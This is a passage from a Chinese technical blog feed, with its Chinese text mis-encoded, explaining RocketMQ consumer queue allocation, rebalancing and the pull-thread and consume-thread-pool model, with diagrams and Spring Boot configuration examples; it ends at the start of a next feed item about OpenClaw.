<p>RocketMQä½¿ç”¨ <code>AllocateMessageQueueAveragely</code> ç­–ç•¥ï¼š</p>
<ul>
<li>8ä¸ªé˜Ÿåˆ— Ã· 2ä¸ªConsumer = æ¯ä¸ªConsumeråˆ†é…4ä¸ªé˜Ÿåˆ—</li>
<li>Consumer-1 åˆ†é… Queue 0-3</li>
<li>Consumer-2 åˆ†é… Queue 4-7</li>
</ul>
<h3 data-id="heading-13">4.2 å¸¸è§çš„é˜Ÿåˆ—åˆ†é…åœºæ™¯</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
    subgraph S1["åœºæ™¯1: é˜Ÿåˆ—æ•° = Consumeræ•°"]
    A1["8 Queues"] --&gt;|å®Œç¾å‡åˆ†| B1["8 Consumersæ¯äºº1ä¸ª"]
    end
    
    subgraph S2["åœºæ™¯2: é˜Ÿåˆ—æ•° &gt; Consumeræ•°"]
    A2["8 Queues"] --&gt;|å‡åˆ†| B2["2 Consumersæ¯äºº4ä¸ª"]
    end
    
    subgraph S3["åœºæ™¯3: é˜Ÿåˆ—æ•° &lt; Consumeræ•°"]
    A3["4 Queues"] --&gt;|æœ‰äººç©ºé—²| B3["8 Consumers 4äººå·¥ä½œ 4äººç©ºé—²"]
    end
    
    style A1 fill:#e8f5e9,stroke:#2e7d32
    style B1 fill:#e8f5e9,stroke:#2e7d32
    style A2 fill:#fff3e0,stroke:#e65100
    style B2 fill:#fff3e0,stroke:#e65100
    style A3 fill:#ffebee,stroke:#c62828
    style B3 fill:#ffebee,stroke:#c62828
</code></pre>
<p><strong>é‡è¦ç»“è®ºï¼š</strong></p>
<ul>
<li>é˜Ÿåˆ—æ˜¯æ¶ˆè´¹å¹¶å‘çš„åŸºæœ¬å•ä½</li>
<li>Consumeræ•°é‡ &gt; é˜Ÿåˆ—æ•°é‡æ—¶ï¼Œå¤šä½™çš„Consumerä¼šç©ºé—²</li>
<li>æƒ³æé«˜æ¶ˆè´¹å¹¶å‘ï¼Œåº”è¯¥å¢åŠ é˜Ÿåˆ—æ•°ï¼Œè€Œä¸æ˜¯ç›²ç›®å¢åŠ Consumer</li>
</ul>
<h3 data-id="heading-14">4.3 Rebalanceï¼šåŠ¨æ€é‡åˆ†é…</h3>
<p>å½“Consumeræ•°é‡å˜åŒ–æ—¶ï¼ˆæ–°å¢ã€ä¸‹çº¿ã€å´©æºƒï¼‰ï¼Œä¼šè§¦å‘Rebalanceé‡æ–°åˆ†é…é˜Ÿåˆ—ã€‚</p>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant C1 as Consumer-1
    participant C2 as Consumer-2
    participant C3 as Consumer-3(æ–°åŠ å…¥)
    participant B as Broker
    
    rect rgb(232, 245, 233)
    Note over C1,C2: åˆå§‹çŠ¶æ€ï¼š2ä¸ªConsumer
    Note over C1: æŒæœ‰ Q0,Q1,Q2,Q3
    Note over C2: æŒæœ‰ Q4,Q5,Q6,Q7
    end
    
    rect rgb(255, 243, 224)
    Note over C1,C3: Consumer-3 åŠ å…¥
    C3-&gt;&gt;B: æˆ‘åŠ å…¥äº† ConsumerGroup
    B-&gt;&gt;C1: è§¦å‘ Rebalance
    B-&gt;&gt;C2: è§¦å‘ Rebalance
    B-&gt;&gt;C3: è§¦å‘ Rebalance
    end
    
    rect rgb(227, 242, 253)
    Note over C1,C3: é‡æ–°åˆ†é…å®Œæˆ
    Note over C1: æŒæœ‰ Q0,Q1,Q2
    Note over C2: æŒæœ‰ Q3,Q4,Q5
    Note over C3: æŒæœ‰ Q6,Q7
    end
</code></pre>
<p><strong>Rebalanceçš„å½±å“ï¼š</strong></p>
<ul>
<li>ä¼šçŸ­æš‚æš‚åœæ¶ˆè´¹ï¼ˆé€šå¸¸å‡ ç§’ï¼‰</li>
<li>å¯èƒ½å¯¼è‡´æ¶ˆæ¯é‡å¤æ¶ˆè´¹ï¼ˆéœ€è¦ä¸šåŠ¡ä¿è¯å¹‚ç­‰ï¼‰</li>
<li>é¢‘ç¹Rebalanceä¼šå½±å“æ€§èƒ½</li>
</ul>
<h2 data-id="heading-15">äº”ã€çº¿ç¨‹æ¨¡å‹ï¼šæ‹‰å–çº¿ç¨‹ vs æ¶ˆè´¹çº¿ç¨‹</h2>
<p>è¿™æ˜¯ç†è§£RocketMQæ¶ˆè´¹æœºåˆ¶æœ€æ ¸å¿ƒçš„éƒ¨åˆ†ã€‚å¾ˆå¤šäººä»¥ä¸ºConsumeråªæœ‰ä¸€ä¸ªçº¿ç¨‹ï¼Œå…¶å®å†…éƒ¨æœ‰ä¸¤å¥—å®Œå…¨ç‹¬ç«‹çš„çº¿ç¨‹æœºåˆ¶ã€‚</p>
<h3 data-id="heading-16">5.1 åŒçº¿ç¨‹æ¨¡å‹æ€»è§ˆ</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    subgraph Consumer["Consumerè¿›ç¨‹"]
        subgraph Pull["æ‹‰å–å±‚"]
        PT["PullMessageService&lt;br/&gt;æ‹‰å–çº¿ç¨‹(å•çº¿ç¨‹)"]
        end
        
        subgraph Cache["ç¼“å­˜å±‚"]
        PQ1["ProcessQueue-1"]
        PQ2["ProcessQueue-2"]
        PQ3["ProcessQueue-3"]
        PQ4["ProcessQueue-4"]
        end
        
        subgraph Consume["æ¶ˆè´¹å±‚"]
        TP["æ¶ˆè´¹çº¿ç¨‹æ± &lt;br/&gt;(é»˜è®¤20-64çº¿ç¨‹)"]
        end
    end
    
    Broker --&gt;|é•¿è½®è¯¢æ‹‰å–| PT
    PT --&gt;|åˆ†å‘åˆ°å¯¹åº”é˜Ÿåˆ—| PQ1 &amp; PQ2 &amp; PQ3 &amp; PQ4
    PQ1 &amp; PQ2 &amp; PQ3 &amp; PQ4 --&gt;|æäº¤æ¶ˆè´¹ä»»åŠ¡| TP
    TP --&gt;|å›è°ƒ| Listener["ä½ çš„ onMessage æ–¹æ³•"]
    
    style PT fill:#fff3e0,stroke:#e65100,stroke-width:2px
    style PQ1 fill:#f3e5f5,stroke:#4a148c
    style PQ2 fill:#f3e5f5,stroke:#4a148c
    style PQ3 fill:#f3e5f5,stroke:#4a148c
    style PQ4 fill:#f3e5f5,stroke:#4a148c
    style TP fill:#e8f5e9,stroke:#1b5e20,stroke-width:2px
    style Listener fill:#fff9c4,stroke:#f57f17,stroke-width:2px
</code></pre>
<h3 data-id="heading-17">5.2 æ‹‰å–çº¿ç¨‹ï¼šå•çº¿ç¨‹è½®è¯¢</h3>
<p>æ‹‰å–çº¿ç¨‹æ˜¯ä¸€ä¸ªå•çº¿ç¨‹ï¼ŒèŒè´£å¾ˆç®€å•ï¼šä¸åœåœ°è½®è¯¢æ‰€æœ‰åˆ†é…çš„é˜Ÿåˆ—ã€‚</p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart LR
    Start(["å¯åŠ¨"]) --&gt; Loop{"è¿è¡Œä¸­?"}
    Loop --&gt;|æ˜¯| Q1["æ‹‰å– Queue-0"]
    Q1 --&gt; Q2["æ‹‰å– Queue-1"]
    Q2 --&gt; Q3["æ‹‰å– Queue-2"]
    Q3 --&gt; Q4["æ‹‰å– Queue-3"]
    Q4 --&gt; Loop
    Loop --&gt;|å¦| End(["ç»“æŸ"])
    
    style Start fill:#e8f5e9,stroke:#2e7d32
    style Loop fill:#fff3e0,stroke:#e65100
    style Q1 fill:#e1f5ff,stroke:#01579b
    style Q2 fill:#e1f5ff,stroke:#01579b
    style Q3 fill:#e1f5ff,stroke:#01579b
    style Q4 fill:#e1f5ff,stroke:#01579b
    style End fill:#ffebee,stroke:#c62828
</code></pre>
<p><strong>å…³é”®ç‚¹ï¼š</strong></p>
<ul>
<li>åªæœ‰1ä¸ªä¸“é—¨çš„æ‹‰å–çº¿ç¨‹</li>
<li>è½®è¯¢æ‰€æœ‰é˜Ÿåˆ—ï¼ˆQueue-0, 1, 2, 3...ï¼‰</li>
<li>ä½¿ç”¨é•¿è½®è¯¢ï¼Œä¸ä¼šé¢‘ç¹å ç”¨CPU</li>
<li>æ‹‰å–åˆ°çš„æ¶ˆæ¯æ”¾å…¥ProcessQueue</li>
</ul>
<h3 data-id="heading-18">5.3 ProcessQueueï¼šæœ¬åœ°æ¶ˆæ¯ç¼“å­˜</h3>
<p>ProcessQueueæ˜¯è¿æ¥æ‹‰å–å’Œæ¶ˆè´¹çš„æ¡¥æ¢ï¼Œæ¯ä¸ªé˜Ÿåˆ—éƒ½æœ‰ä¸€ä¸ªç‹¬ç«‹çš„ProcessQueueã€‚</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
    A["æ‹‰å–çº¿ç¨‹"] --&gt;|æ”¾å…¥æ¶ˆæ¯| B["ProcessQueue&lt;br/&gt;æœ¬åœ°ç¼“å­˜&lt;br/&gt;æœ€å¤š1000æ¡"]
    B --&gt;|å–å‡ºæ¶ˆæ¯| C["æ¶ˆè´¹çº¿ç¨‹æ± "]
    B --&gt;|è¶…è¿‡1000æ¡| D["æš‚åœæ‹‰å–&lt;br/&gt;é˜²æ­¢å†…å­˜æº¢å‡º"]
    
    style A fill:#fff3e0,stroke:#e65100
    style B fill:#f3e5f5,stroke:#4a148c,stroke-width:2px
    style C fill:#e8f5e9,stroke:#1b5e20
    style D fill:#ffebee,stroke:#c62828
</code></pre>
<p><strong>ProcessQueueçš„ä½œç”¨ï¼š</strong></p>
<ol>
<li>è§£è€¦æ‹‰å–å’Œæ¶ˆè´¹ï¼šæ‹‰å–çº¿ç¨‹å’Œæ¶ˆè´¹çº¿ç¨‹äº’ä¸é˜»å¡</li>
<li>æµé‡æ§åˆ¶ï¼šç¼“å­˜æ»¡äº†å°±æš‚åœæ‹‰å–</li>
<li>æ‰¹é‡å¤„ç†ï¼šæ¶ˆè´¹çº¿ç¨‹å¯ä»¥æ‰¹é‡å–æ¶ˆæ¯</li>
</ol>
<h3 data-id="heading-19">5.4 æ¶ˆè´¹çº¿ç¨‹æ± ï¼šå¤šçº¿ç¨‹å¹¶å‘æ¶ˆè´¹</h3>
<p>æ¶ˆè´¹çº¿ç¨‹æ± æ˜¯çœŸæ­£æ‰§è¡Œä¸šåŠ¡é€»è¾‘çš„åœ°æ–¹ï¼Œé»˜è®¤æœ‰20-64ä¸ªçº¿ç¨‹ã€‚</p>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant PQ1 as ProcessQueue-1
    participant PQ2 as ProcessQueue-2
    participant Pool as æ¶ˆè´¹çº¿ç¨‹æ± 
    participant T1 as Thread-1
    participant T2 as Thread-2
    
    rect rgb(232, 245, 233)
    PQ1-&gt;&gt;Pool: æäº¤æ¶ˆè´¹ä»»åŠ¡(3æ¡æ¶ˆæ¯)
    Pool-&gt;&gt;T1: åˆ†é…ç»™Thread-1
    T1-&gt;&gt;T1: onMessage(msg1)&lt;br/&gt;onMessage(msg2)&lt;br/&gt;onMessage(msg3)
    end
    
    rect rgb(255, 243, 224)
    PQ2-&gt;&gt;Pool: æäº¤æ¶ˆè´¹ä»»åŠ¡(5æ¡æ¶ˆæ¯)
    Pool-&gt;&gt;T2: åˆ†é…ç»™Thread-2
    T2-&gt;&gt;T2: onMessage(msg4)&lt;br/&gt;onMessage(msg5)
    end
</code></pre>
<p><strong>æ¶ˆè´¹çº¿ç¨‹æ± çš„ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>å¤šä¸ªçº¿ç¨‹å¹¶å‘æ¶ˆè´¹ï¼ˆé»˜è®¤20-64ä¸ªï¼‰</li>
<li>ä¸ç»‘å®šç‰¹å®šé˜Ÿåˆ—ï¼šå“ªä¸ªçº¿ç¨‹ç©ºé—²å°±æ¶ˆè´¹å“ªä¸ªæ¶ˆæ¯</li>
<li>ä½ çš„<code>onMessage()</code>æ–¹æ³•æ˜¯è¢«è¿™äº›çº¿ç¨‹è°ƒç”¨çš„</li>
</ul>
<h3 data-id="heading-20">5.5 å®Œæ•´çš„æ¶ˆæ¯æµè½¬</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant B as Broker
    participant PT as æ‹‰å–çº¿ç¨‹
    participant PQ as ProcessQueue
    participant Pool as æ¶ˆè´¹çº¿ç¨‹æ± 
    participant Listener as Listener
    
    Note over B,PT: æ‹‰å–çº¿ç¨‹å·¥ä½œ
    PT-&gt;&gt;B: æ‹‰å– Queue-0
    B--&gt;&gt;PT: è¿”å› msg1, msg2
    PT-&gt;&gt;PQ: æ”¾å…¥ç¼“å­˜
    
    Note over PQ,Pool: æäº¤æ¶ˆè´¹ä»»åŠ¡
    PQ-&gt;&gt;Pool: æäº¤ä»»åŠ¡(msg1, msg2)
    
    Note over Pool,Listener: æ¶ˆè´¹çº¿ç¨‹å¤„ç†
    Pool-&gt;&gt;Listener: Thread-1: onMessage(msg1)
    Pool-&gt;&gt;Listener: Thread-2: onMessage(msg2)
    
    Listener--&gt;&gt;Pool: SUCCESS
    Pool-&gt;&gt;B: ACK
</code></pre>
<p><strong>å…³é”®ç†è§£ï¼š</strong></p>
<ol>
<li>æ‹‰å–çº¿ç¨‹åªè´Ÿè´£æ‹‰æ¶ˆæ¯</li>
<li>æ¶ˆè´¹çº¿ç¨‹åªè´Ÿè´£æ¶ˆè´¹</li>
<li>ProcessQueueæ˜¯ä¸­é—´ç¼“å†²åŒº</li>
<li>æ¶ˆè´¹çº¿ç¨‹ä¸ç»‘å®šé˜Ÿåˆ—ï¼Œçµæ´»è°ƒåº¦</li>
</ol>
<h2 data-id="heading-21">å…­ã€çº¿ç¨‹é…ç½®ï¼šä¸è¦è¿·ä¿¡çº¿ç¨‹æ•°</h2>
<p>å¾ˆå¤šäººé‡åˆ°æ¶ˆè´¹æ…¢çš„ç¬¬ä¸€ååº”æ˜¯ï¼šåŠ çº¿ç¨‹ï¼ä½†è¿™å¾€å¾€æ˜¯é”™è¯¯çš„ã€‚</p>
<h3 data-id="heading-22">6.1 Spring Boot Starterçš„çº¿ç¨‹é…ç½®</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@RocketMQMessageListener(
    topic = "order-topic",
    consumerGroup = "order-group",
    consumeThreadMin = 20,      // æœ€å°æ¶ˆè´¹çº¿ç¨‹æ•°
    consumeThreadMax = 64,      // æœ€å¤§æ¶ˆè´¹çº¿ç¨‹æ•°
    consumeTimeout = 15         // å•æ¡æ¶ˆæ¯æ¶ˆè´¹è¶…æ—¶æ—¶é—´ï¼ˆåˆ†é’Ÿï¼‰
)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderListener</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">RocketMQListener</span>&lt;Order&gt; {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onMessage</span><span class="hljs-params">(Order order)</span> {
        <span class="hljs-comment">// ä½ çš„ä¸šåŠ¡é€»è¾‘</span>
    }
}
</code></pre>
<h3 data-id="heading-23">6.2 æ¶ˆè´¹æ€§èƒ½çš„çœŸæ­£ç“¶é¢ˆ</h3>
<p>å¾ˆå¤šäººé‡åˆ°æ¶ˆè´¹æ…¢çš„ç¬¬ä¸€ååº”æ˜¯ï¼šåŠ çº¿ç¨‹ï¼ä½†è¿™å¾€å¾€æ˜¯é”™è¯¯çš„ã€‚</p>
<p><strong>æ€§èƒ½ç“¶é¢ˆåˆ†æï¼š</strong></p>
<ol>
<li>
<p><strong>é˜Ÿåˆ—æ•°ä¸å¤Ÿ</strong>ï¼šè¿™æ˜¯æœ€å¸¸è§çš„é—®é¢˜</p>
<ul>
<li>4ä¸ªé˜Ÿåˆ— + 40ä¸ªçº¿ç¨‹ = å®é™…åªæœ‰4ä¸ªçº¿ç¨‹å·¥ä½œ</li>
<li>è§£å†³ï¼šå¢åŠ é˜Ÿåˆ—æ•°åˆ°16-32ä¸ª</li>
</ul>
</li>
<li>
<p><strong>çº¿ç¨‹æ•°ä¸å¤Ÿ</strong>ï¼šé˜Ÿåˆ—å¤Ÿä½†çº¿ç¨‹å…¨å¿™</p>
<ul>
<li>é˜Ÿåˆ—æ•° = 16ï¼Œçº¿ç¨‹æ•° = 5ï¼Œæœ‰11ä¸ªé˜Ÿåˆ—åœ¨ç­‰å¾…</li>
<li>è§£å†³ï¼šå¢åŠ çº¿ç¨‹æ•°åˆ°16-20ä¸ª</li>
</ul>
</li>
<li>
<p><strong>ä¸šåŠ¡å¤„ç†æ…¢</strong>ï¼šçº¿ç¨‹å¤Ÿä½†æ¯æ¡æ¶ˆæ¯å¤„ç†å¾ˆæ…¢</p>
<ul>
<li>ä¸šåŠ¡è€—æ—¶100msï¼Œå³ä½¿100ä¸ªçº¿ç¨‹ä¹Ÿæ…¢</li>
<li>è§£å†³ï¼šä¼˜åŒ–ä¸šåŠ¡é€»è¾‘ï¼ŒåŠ ç¼“å­˜/ç´¢å¼•/å¼‚æ­¥å¤„ç†</li>
</ul>
</li>
</ol>
<p><strong>ä¼˜åŒ–é¡ºåºï¼šé˜Ÿåˆ—æ•° â†’ ä¸šåŠ¡ä¼˜åŒ– â†’ çº¿ç¨‹æ•°</strong></p>
<h3 data-id="heading-24">6.3 é˜Ÿåˆ—æ•°æ‰æ˜¯æ¶ˆè´¹å¹¶å‘çš„ä¸Šé™</h3>
<p><strong>æ ¸å¿ƒåŸåˆ™ï¼šæ¶ˆè´¹å¹¶å‘åº¦ = min(é˜Ÿåˆ—æ•°, Consumeræ•° Ã— çº¿ç¨‹æ•°)</strong></p>
<p>çœ‹è¿™ä¸ªä¾‹å­ï¼š</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    Q["Topicæœ‰4ä¸ªé˜Ÿåˆ—"] --&gt; C1["Consumer-1æŒæœ‰2ä¸ªé˜Ÿåˆ—&lt;br/&gt;é…ç½®20çº¿ç¨‹"]
    Q --&gt; C2["Consumer-2æŒæœ‰2ä¸ªé˜Ÿåˆ—&lt;br/&gt;é…ç½®20çº¿ç¨‹"]
    C1 --&gt; R["å®é™…ç»“æœ:&lt;br/&gt;æœ€å¤š4ä¸ªçº¿ç¨‹åœ¨å·¥ä½œ&lt;br/&gt;å…¶ä½™36ä¸ªçº¿ç¨‹ç©ºé—²"]
    C2 --&gt; R
    
    style Q fill:#e1f5ff,stroke:#01579b,stroke-width:2px
    style C1 fill:#fff3e0,stroke:#e65100
    style C2 fill:#fff3e0,stroke:#e65100
    style R fill:#ffebee,stroke:#c62828,stroke-width:3px
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆï¼Ÿ</strong></p>
<ul>
<li>4ä¸ªé˜Ÿåˆ—è¢«å¹³å‡åˆ†é…ï¼šæ¯ä¸ªConsumeræŒæœ‰2ä¸ªé˜Ÿåˆ—</li>
<li>æ¯ä¸ªé˜Ÿåˆ—åŒä¸€æ—¶åˆ»åªèƒ½è¢«1ä¸ªçº¿ç¨‹æ¶ˆè´¹</li>
<li>æ‰€ä»¥å®é™…å·¥ä½œçš„çº¿ç¨‹æœ€å¤šåªæœ‰4ä¸ª</li>
<li>å…¶ä½™çš„36ä¸ªçº¿ç¨‹éƒ½åœ¨ç©ºé—²ç­‰å¾…</li>
</ul>
<p><strong>æ­£ç¡®çš„åšæ³•ï¼š</strong></p>
<ol>
<li>å…ˆå¢åŠ é˜Ÿåˆ—æ•°åˆ°16-32ä¸ª</li>
<li>æ ¹æ®é˜Ÿåˆ—æ•°è°ƒæ•´Consumeræ•°é‡</li>
<li>æœ€åè°ƒæ•´çº¿ç¨‹æ•°ï¼ˆç•¥å¤§äºå¹³å‡é˜Ÿåˆ—æ•°ï¼‰</li>
</ol>
<h3 data-id="heading-25">6.4 çº¿ç¨‹é…ç½®çš„å®è·µå»ºè®®</h3>
<p><strong>è§„åˆ™1ï¼šé˜Ÿåˆ—æ•°ä¼˜å…ˆäºçº¿ç¨‹æ•°</strong></p>
<p>å…ˆç¡®ä¿é˜Ÿåˆ—æ•°è¶³å¤Ÿï¼ˆå»ºè®®16-32ä¸ªï¼‰ï¼Œå†è°ƒæ•´çº¿ç¨‹æ•°ã€‚</p>
<p><strong>è§„åˆ™2ï¼šçº¿ç¨‹æ•°ç•¥å¤§äºå¹³å‡é˜Ÿåˆ—æ•°</strong></p>
<pre><code class="hljs language-ini" lang="ini">å‡è®¾ï¼šé˜Ÿåˆ—æ•° = 16, Consumeræ•° = 2
å¹³å‡æ¯ä¸ªConsumeråˆ†é… = 16 / <span class="hljs-attr">2</span> = <span class="hljs-number">8</span>ä¸ªé˜Ÿåˆ—
å»ºè®®çº¿ç¨‹æ•° = 8 åˆ° 16ä¸ªçº¿ç¨‹
</code></pre>
<p><strong>è§„åˆ™3ï¼šæ ¹æ®ä¸šåŠ¡è€—æ—¶è°ƒæ•´</strong></p>
<ul>
<li>ä¸šåŠ¡å¾ˆå¿«ï¼ˆå‡ æ¯«ç§’ï¼‰ï¼šçº¿ç¨‹æ•° = é˜Ÿåˆ—æ•°</li>
<li>ä¸šåŠ¡è¾ƒæ…¢ï¼ˆå‡ åæ¯«ç§’ï¼‰ï¼šçº¿ç¨‹æ•° = é˜Ÿåˆ—æ•° Ã— 1.5</li>
<li>ä¸šåŠ¡å¾ˆæ…¢ï¼ˆæœ‰IOæ“ä½œï¼‰ï¼šçº¿ç¨‹æ•° = é˜Ÿåˆ—æ•° Ã— 2ï¼Œä½†æ›´åº”è¯¥ä¼˜åŒ–ä¸šåŠ¡é€»è¾‘</li>
</ul>
<p><strong>é…ç½®ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@RocketMQMessageListener(
    topic = "order-topic",
    consumerGroup = "order-group",
    consumeThreadMin = 10,     // æœ€å°çº¿ç¨‹æ•°
    consumeThreadMax = 20      // æœ€å¤§çº¿ç¨‹æ•°
)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderListener</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">RocketMQListener</span>&lt;Order&gt; {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onMessage</span><span class="hljs-params">(Order order)</span> {
        <span class="hljs-comment">// ä¸šåŠ¡é€»è¾‘</span>
    }
}
</code></pre>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># application.yml</span>
<span class="hljs-attr">rocketmq:</span>
  <span class="hljs-attr">consumer:</span>
    <span class="hljs-attr">pull-batch-size:</span> <span class="hljs-number">32</span>        <span class="hljs-comment"># æ¯æ¬¡æ‹‰å–æ¶ˆæ¯æ•°</span>
    <span class="hljs-attr">pull-timeout:</span> <span class="hljs-number">30000</span>        <span class="hljs-comment"># é•¿è½®è¯¢è¶…æ—¶30ç§’</span>
</code></pre>
<h2 data-id="heading-26">ä¸ƒã€æ€»ç»“</h2>
<h3 data-id="heading-27">æ ¸å¿ƒè¦ç‚¹</h3>
<ol>
<li>
<p><strong>æ¨æ‹‰æ¨¡å¼çš„æœ¬è´¨</strong></p>
<ul>
<li>è¡¨é¢æ˜¯æ¨æ¨¡å¼ï¼Œåº•å±‚æ˜¯æ‹‰æ¨¡å¼</li>
<li>é€šè¿‡é•¿è½®è¯¢å®ç°é«˜å®æ—¶æ€§å’Œä½èµ„æºæ¶ˆè€—</li>
</ul>
</li>
<li>
<p><strong>åŒçº¿ç¨‹æ¶æ„</strong></p>
<ul>
<li>æ‹‰å–çº¿ç¨‹ï¼šå•çº¿ç¨‹è½®è¯¢æ‰€æœ‰é˜Ÿåˆ—</li>
<li>æ¶ˆè´¹çº¿ç¨‹æ± ï¼šå¤šçº¿ç¨‹å¹¶å‘æ¶ˆè´¹</li>
<li>ProcessQueueï¼šè¿æ¥æ‹‰å–å’Œæ¶ˆè´¹çš„æ¡¥æ¢</li>
</ul>
</li>
<li>
<p><strong>æ€§èƒ½å…³é”®å› ç´ </strong></p>
<ul>
<li>é˜Ÿåˆ—æ•°æ˜¯æ¶ˆè´¹å¹¶å‘çš„çœŸæ­£ä¸Šé™</li>
<li>æ¶ˆè´¹å¹¶å‘åº¦ = min(é˜Ÿåˆ—æ•°, Consumeræ•° Ã— çº¿ç¨‹æ•°)</li>
<li>ä¸è¦ç›²ç›®å¢åŠ çº¿ç¨‹æ•°ï¼Œä¼˜å…ˆå¢åŠ é˜Ÿåˆ—æ•°</li>
</ul>
</li>
<li>
<p><strong>é…ç½®å»ºè®®</strong></p>
<ul>
<li>é˜Ÿåˆ—æ•°ï¼š16-32ä¸ªï¼ˆæ ¹æ®ä¸šåŠ¡é‡è°ƒæ•´ï¼‰</li>
<li>çº¿ç¨‹æ•°ï¼šç•¥å¤§äºå¹³å‡é˜Ÿåˆ—æ•°ï¼ˆ1.5-2å€ï¼‰</li>
<li>é•¿è½®è¯¢ä¿æŒ30ç§’é»˜è®¤å€¼</li>
</ul>
</li>
</ol>
<h3 data-id="heading-28">æ•´ä½“æ¶æ„</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    subgraph Producer[ç”Ÿäº§ç«¯]
    P[Producer]
    end
    
    subgraph Broker[Brokeré›†ç¾¤]
    T[Topic: 16ä¸ªé˜Ÿåˆ—]
    end
    
    subgraph Consumer1[Consumer-1]
    PT1[æ‹‰å–çº¿ç¨‹]
    PQ1[ProcessQueue]
    TP1[æ¶ˆè´¹çº¿ç¨‹æ± ]
    L1[Listener]
    end
    
    subgraph Consumer2[Consumer-2]
    PT2[æ‹‰å–çº¿ç¨‹]
    PQ2[ProcessQueue]
    TP2[æ¶ˆè´¹çº¿ç¨‹æ± ]
    L2[Listener]
    end
    
    P --&gt;|å‘é€æ¶ˆæ¯| T
    T --&gt;|é•¿è½®è¯¢æ‹‰å–| PT1
    T --&gt;|é•¿è½®è¯¢æ‹‰å–| PT2
    PT1 --&gt; PQ1
    PT2 --&gt; PQ2
    PQ1 --&gt; TP1
    PQ2 --&gt; TP2
    TP1 --&gt; L1
    TP2 --&gt; L2
    
    style P fill:#e1f5ff,stroke:#01579b
    style T fill:#fff3e0,stroke:#e65100,stroke-width:2px
    style PT1 fill:#f3e5f5,stroke:#4a148c
    style PT2 fill:#f3e5f5,stroke:#4a148c
    style PQ1 fill:#fff9c4,stroke:#f57f17
    style PQ2 fill:#fff9c4,stroke:#f57f17
    style TP1 fill:#e8f5e9,stroke:#1b5e20
    style TP2 fill:#e8f5e9,stroke:#1b5e20
    style L1 fill:#ffebee,stroke:#c62828
    style L2 fill:#ffebee,stroke:#c62828
</code></pre>
<p>ç†è§£äº†RocketMQçš„æ¶ˆè´¹æœºåˆ¶ï¼Œå°±èƒ½åœ¨å®é™…å·¥ä½œä¸­åˆç†é…ç½®Consumerï¼Œé¿å…æ€§èƒ½é—®é¢˜ã€‚è®°ä½ï¼š<strong>ç†è§£åŸç†æ¯”è®°ä½é…ç½®æ›´é‡è¦</strong>ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸€æ–‡è¯»æ‡‚OpenClawæ ¸å¿ƒç‰¹æ€§ä¸åŸç†è§£æ(æ–‡æœ«é™„å›½äº§å¤§æ¨¡å‹+èŠå¤©è½¯ä»¶æ¥å…¥OpenClawè§†é¢‘æ•™ç¨‹åœ°å€)]]></title>    <link>https://juejin.cn/post/7602466689713078287</link>    <guid>https://juejin.cn/post/7602466689713078287</guid>    <pubDate>2026-02-04T02:55:08.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602466689713078287" data-draft-id="7602106969698566207" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸€æ–‡è¯»æ‡‚OpenClawæ ¸å¿ƒç‰¹æ€§ä¸åŸç†è§£æ(æ–‡æœ«é™„å›½äº§å¤§æ¨¡å‹+èŠå¤©è½¯ä»¶æ¥å…¥OpenClawè§†é¢‘æ•™ç¨‹åœ°å€)"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½,LangChain,Agent"/> <meta itemprop="datePublished" content="2026-02-04T02:55:08.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¤§æ¨¡å‹çœŸå¥½ç©"/> <meta itemprop="url" content="https://juejin.cn/user/3140624091453053"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸€æ–‡è¯»æ‡‚OpenClawæ ¸å¿ƒç‰¹æ€§ä¸åŸç†è§£æ(æ–‡æœ«é™„å›½äº§å¤§æ¨¡å‹+èŠå¤©è½¯ä»¶æ¥å…¥OpenClawè§†é¢‘æ•™ç¨‹åœ°å€)
